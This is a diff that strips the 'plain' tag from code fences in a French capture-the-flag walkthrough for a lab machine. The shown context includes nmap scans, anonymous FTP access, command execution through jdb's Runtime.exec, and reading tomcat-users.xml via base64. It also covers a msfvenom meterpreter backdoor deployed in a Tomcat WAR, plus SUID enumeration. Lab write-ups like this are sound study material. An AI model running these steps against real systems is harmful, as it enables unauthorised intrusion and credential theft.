@@ -19,7 +19,7 @@ Ensuite *Nmap* ne voit aucun port ouvert lors d'un scan SYN et affiche un messag
 
 Avec un scan plus bruyant (*sudo nmap -T5 -A -p- --open 192.168.1.50 -PN -sT -sC* ) on obtient ce que l'on voulait savoir :  
 
-```plain
+```
 Nmap scan report for 192.168.1.50
 Host is up (0.0013s latency).
 Not shown: 65532 filtered ports
@@ -41,7 +41,7 @@ Network Distance: 1 hop
 
 Le serveur FTP que Nmap considère comme un vsftpd permet la connexion en anonyme. Il ne contient qu'un seul fichier appartenant à un utilisateur avec l'UID 1002 :  
 
-```plain
+```
 $ ftp anonymous@192.168.1.50
 Connected to 192.168.1.50.                                                                                                                                                                    
 220 ZzZZzZzz FTP                                                                                                                                                                              
@@ -107,13 +107,13 @@ Certes on peut exécuter des commandes, mais ne pas être en mesure de récupér
 
 Pas mal, ça nous permet de lancer une commande et de récupérer la première ligne de la sortie. Suffisant pour récupérer le nom d'utilisateur sous lequel on tourne via la commande suivante :  
 
-```plain
+```
 print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("id").getInputStream())).readLine())
 ```
 
 Avec un peu de jugeote on peu utiliser la commande base64 pour récupérer le contenu d'un fichier encodé en une seule ligne :  
 
-```plain
+```
 base64 -w 0 /etc/tomcat/tomcat-users.xml
 ```
 
@@ -131,13 +131,13 @@ IPv6 ? Récupérer l'output de *ip -6 addr* est compliqué à cause du fait qu'o
 
 Heureusement si je lance un *ping6 -c 1 mon\_adresse\_ipv6* j'obtiens bien une ligne dans un *tshark* préalablement lancé (*sudo tshark -i any icmp6*) :   
 
-```plain
+```
 30 51.222553564 2a01:dead:beef:cafe:babe:0ff:1ce:fc3 → 2a01:decaf:f00d:face:bad:a55:c0f3:f26c ICMPv6 120 Echo (ping) request id=0x074e, seq=1, hop limit=64
 ```
 
 Je relance un scan Nmap en IPv6, pas de pépites mais au moins on a le serveur Tomcat sans relais :  
 
-```plain
+```
 PORT     STATE SERVICE
 8009/tcp open  ajp13
 8080/tcp open  http-proxy
@@ -162,13 +162,13 @@ Ce shell est certes plus sexy à première vue... mais on s'aperçoit vite qu'il
 
 Pour cela on va réutiliser la fonctionnalité d'upload du Tomcat en intégrant une backdoor dans une archive war :  
 
-```plain
+```
 msfvenom -p linux/x86/meterpreter/bind_ipv6_tcp LPORT=9999 -f elf > backdoor
 ```
 
 Une fois le war déployé on retrouve la backdoor dans l'arborescence du Tomcat. Il ne reste plus qu'à l'exécuter via jdb si on veut un shell avec l'utilisateur *sleepy* :  
 
-```plain
+```
 print new java.lang.Runtime().exec("/usr/share/tomcat/webapps/cmd/backdoor")
 ```
 
@@ -177,7 +177,7 @@ Permis de tuer
 
 Une fois le *meterpreter* récupéré on fouille un peu :  
 
-```plain
+```
 bash-4.2$ find / -perm -u+s 2> /dev/null
 find / -perm -u+s 2> /dev/null
 /usr/bin/mount
@@ -211,7 +211,7 @@ Haha quand je pense que je me suis démené pour avoir les droits de *sleepy* :'
 
 Une fois le binaire (enfin) obtenu et après un strings rapide on peut le lancer avec *ltrace* :  
 
-```plain
+```
 __libc_start_main([ "./nightmare" ] <unfinished ...>
 memset(0x7fff4e6ecd30, '\0', 152)                                                                                                                  = 0x7fff4e6ecd30
 sigaction(SIGINT, { 0x40081f, <>, 0, nil }, nil)                                                                                                   = 0
